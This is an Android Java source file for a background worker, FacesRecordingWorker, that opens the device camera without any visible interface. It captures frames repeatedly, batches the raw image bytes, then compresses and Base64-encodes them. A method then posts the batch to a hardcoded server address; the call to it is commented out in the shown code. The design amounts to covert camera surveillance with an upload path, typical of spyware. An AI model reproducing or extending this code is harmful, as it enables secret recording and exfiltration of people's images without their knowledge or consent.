package com.inward0;

import static android.content.Context.DEVICE_POLICY_SERVICE;

import android.annotation.SuppressLint;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.TotalCaptureResult;
import android.media.Image;
import android.media.ImageReader;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.util.Log;
import android.view.Surface;

import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.util.Arrays;
import java.util.Base64;
import java.util.Objects;
import java.util.concurrent.Executors;
import java.util.zip.GZIPOutputStream;

import okhttp3.Call;
import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class FacesRecordingWorker extends Worker {

    private String byteString = "";
    private int images = 0;

    // private AppDataBase db;
    private CameraCaptureSession mSession = null;
    public FacesRecordingWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
    }

    @SuppressLint("MissingPermission")
    @Override
    public Result doWork() {
        Log.i("--log--", "ngah ngah a hawjiyana");
        try {

            CameraManager manager = (CameraManager) getApplicationContext()
                    .getSystemService(Context.CAMERA_SERVICE);

            String cameraId = manager.getCameraIdList()[0];

            Log.i("--here manager--", cameraId);

            HandlerThread handlerThread = new HandlerThread("Just to get the looper");
            handlerThread.start();
            manager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice camera) {
                    Log.i("--------------------", "onOpened");
                    try {
                        ImageReader imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1);
                        imageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
                            @Override
                            public void onImageAvailable(ImageReader reader) {
                                handleImage(reader);
                            }
                        }, new Handler(handlerThread.getLooper()));

                        Surface surface = imageReader.getSurface();
                        final CaptureRequest.Builder captureRequestBuilder = camera
                                .createCaptureRequest(CameraDevice.TEMPLATE_RECORD);
                        captureRequestBuilder.addTarget(surface);

                        camera.createCaptureSession(Arrays.asList(surface), new CameraCaptureSession.StateCallback() {
                            @Override
                            public void onConfigured(@NonNull CameraCaptureSession session) {
                                Log.i("onConfigured", "------Hamou---------");

                                try {
                                    mSession = session;
                                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                                        mSession.setSingleRepeatingRequest(captureRequestBuilder.build(),
                                                Executors.newSingleThreadExecutor(),
                                                new CameraCaptureSession.CaptureCallback() {
                                                    @Override
                                                    public void onCaptureCompleted(CameraCaptureSession session,
                                                                                   CaptureRequest request,
                                                                                   TotalCaptureResult result) {
                                                        Log.i("-----Here the tag------", "-----------It works");
                                                    }
                                                });
                                    }
                                } catch (CameraAccessException e) {
                                    throw new RuntimeException(e);
                                }
                            }

                            @Override
                            public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                                Log.i("onConfigured", "------Hamou");
                            }
                        }, new Handler(handlerThread.getLooper()));

                    } catch (Exception e) {
                        Log.i("--my error--", Objects.requireNonNull(e.getMessage()));
                    }
                }

                @Override
                public void onDisconnected(CameraDevice camera) {
                    Log.i("--------------------", "onDisconnected");
                }

                @Override
                public void onError(CameraDevice camera, int error) {
                    Log.i("--------------------", "onError + " + error);
                }
            }, new Handler(handlerThread.getLooper()));
        } catch (CameraAccessException e) {
            e.printStackTrace();
        }

        return null;
    }

    private void handleImage(ImageReader reader) {
        Image image = null;
        try {
            image = reader.acquireLatestImage();
            ByteBuffer buffer = image.getPlanes()[0].getBuffer();
            byte[] bytes = new byte[buffer.remaining()];
            buffer.get(bytes);
            byteString += "|" + Arrays.toString(bytes);
            images++;
            Log.i("----image----", "Captured image");
            if (images > 50) {
                Log.i("---ngah ngah----", byteString);
                ByteArrayOutputStream obj = compress(byteString);
                String outStr = Base64.getEncoder().encodeToString(obj.toByteArray());
                //postImageData(outStr);
                images = 0;
                byteString = "";
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (image != null) {
                image.close();
            }
        }
    }

    private ByteArrayOutputStream compress(String byteString) throws IOException {
        ByteArrayOutputStream obj = new ByteArrayOutputStream();
        GZIPOutputStream gzip = new GZIPOutputStream(obj);
        gzip.write(byteString.getBytes());
        gzip.close();
        return obj;
    }

    private Response postImageData(String bytes) throws IOException {
        OkHttpClient client = new OkHttpClient();

        RequestBody formBody = new FormBody.Builder()
                .add("data", bytes)
                .build();

        Request request = new Request.Builder()
                .url("http://192.168.0.107:4000/api/post")
                .post(formBody)
                .build();

        Call call = client.newCall(request);

        return call.execute();
    }
}

